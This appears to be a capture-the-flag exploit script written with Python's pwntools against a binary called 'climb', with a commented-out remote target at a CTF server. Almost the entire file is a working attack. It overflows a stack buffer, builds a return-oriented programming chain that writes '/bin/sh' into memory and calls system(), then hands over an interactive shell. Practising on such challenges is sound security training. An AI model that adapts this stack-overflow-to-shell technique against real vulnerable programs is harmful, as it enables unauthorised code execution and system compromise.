#!/usr/bin/python3

from pwn import *

target = './climb'

context.update(terminal = ['tmux','splitw'])

#==========================================================
#           CODE
#==========================================================

p = process(target)

#p = remote('cha.hackpack.club',41702)

sh = b'/bin/sh\0'
sh = int.from_bytes(sh, byteorder='little')

#gdb.attach(p)

pl = p64(0x4141414141414141) * 5    # padding to ret addr
pl += p64(0x40064b)                 # pop rax
pl += p64(sh)                       # /bin/sh into rax
pl += p64(0x400654)                 # pop rdx
pl += p64(0x601fb0)                 # address on bss
pl += p64(0x40065d)                 # writes rax to address on rdx
pl += p64(0x400743)                 # pop rdi
pl += p64(0x601fb0)                 # address on bss
pl += p64(0x400530)                 # call system()

print(p.recvuntil('respond?'))
p.send(pl)
p.interactive()
